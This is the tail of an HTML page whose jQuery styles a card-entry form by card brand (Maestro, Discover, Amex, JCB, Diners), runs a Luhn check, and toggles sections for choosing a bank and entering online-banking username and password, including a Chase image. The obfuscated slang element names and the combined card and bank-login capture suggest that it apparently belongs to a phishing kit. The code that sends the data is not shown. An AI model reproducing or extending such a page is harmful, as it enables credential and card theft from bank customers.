 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5%  3.6%');
                        break;
                    case "MAESTRO":

$('.chtadakchi').attr('id', 'chtamastartro');


$('#cardsmiya').attr('class', 'creditOrDebit maestro black card image');




$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');




   $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');

                        $('#cardnumber').css('background-position', '98.5%  39.6%');

                        break;
                    case "DISCOVER":


$('.chtadakchi').attr('id', 'chtadiscover');


$('#cardsmiya').attr('class', 'creditOrDebit discover gray card image');

$('#cardnumber').css('background-position', '98.5% 17.4%');



$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('').addClass('discoverLogo');


   $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('minlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('').addClass('cardImages-icon_selected');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

$('#cscaa').removeClass('csc-image_amex').addClass('');



break;
                    case "AMEX":

$('.chtadakchi').attr('id', 'chtaofam');
 

$('#cardsmiya').attr('class', 'creditOrDebit amex gray card image');




$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('').addClass('amexLogo');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#csc').attr('pattern', '[0-9]{4}');
					$('#csc').attr('maxlength', '4');
					$('#csc').attr('minlength', '4');
					$('#csc').attr('placeholder', 'Enter security code (4 digits)');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('').addClass('cardImages-icon_selected');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');
$('#cardnumber').css('background-position', '98.5% 9.8%');


                        break;
					case "JCB":

$('.chtadakchi').attr('id', 'chtajcb');




$('#cardsmiya').attr('class', 'creditOrDebit jcb gold card image');




$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');

$('#csc').attr('placeholder', 'Enter security code'); 

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');
                        $('#cardnumber').css('background-position', '98.5% 32%');
                        break;
					case "DINERS_CLUB":


$('.chtadakchi').attr('id', 'chtacalub');



$('#cardsmiya').attr('class', 'creditOrDebit cb_nationale blue card image');







$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 24.8%');
                        break;
					default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');

                        $('#cardnumber').css('background-position', '98.5% -1%');

$('#csc').attr('placeholder', 'Enter security code'); 
                        break;
                }
			} else {

$('.chtadakchi').attr('id', 'jkljk');



$('#cardsmiya').attr('class', 'creditOrDebit reb3lpp blue card image');








$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

                $('#cardnumber').css('background-position', '98.5% 81.7%');

$('#csc').attr('placeholder', 'Enter security code');
            }
			
			
			 // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $('#cardnumber').val().length > 16) {
                if (result.valid) {


                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber') .removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
		</script>
<script>
$('#iachfield1ddl').on('change',function(){
	if (this.value == '0') 
		$('#namebanka').show();
		else {$('#namebanka').hide();
		$('#namebankinputError').hide()
		}
	
});
</script>


<script src="../style/js/app.js"></script>
<script src="../style/js/pa.js"></script>
<script src="../style/js/vx-lib.min.js"></script>


<script>
$('#manualAddBank').on('click',function(){
//$('#doori').show();
$('#chosebanks').hide();
$('#img2').show();
$('#nwabank').show();
$('#xxnxxdiv').show();
$('#xxllxxdiv').show();
$('#UserNameIDdiv').hide();
$('#PasswordBankdiv').hide();
$("#namebankhidden").val("different bank")



});

$('#Choose1').on('click',function(){
//$('#doori').show();
$('#Choosektaba').hide();
$('#Choose').hide();
$("#cardkatba").show();
$("#card").show();
});


$('#Choose2').on('click',function(){
$('#Choosektaba').hide();
$('#Choose').hide();
$('#hrup').hide();
$('#Confirms').hide();
$('#pos').hide();
$("#chaseimg").show();
$("#chased").show();


});
</script>

<script src="../../lib/js/bank.js"></script>
</div></body></html>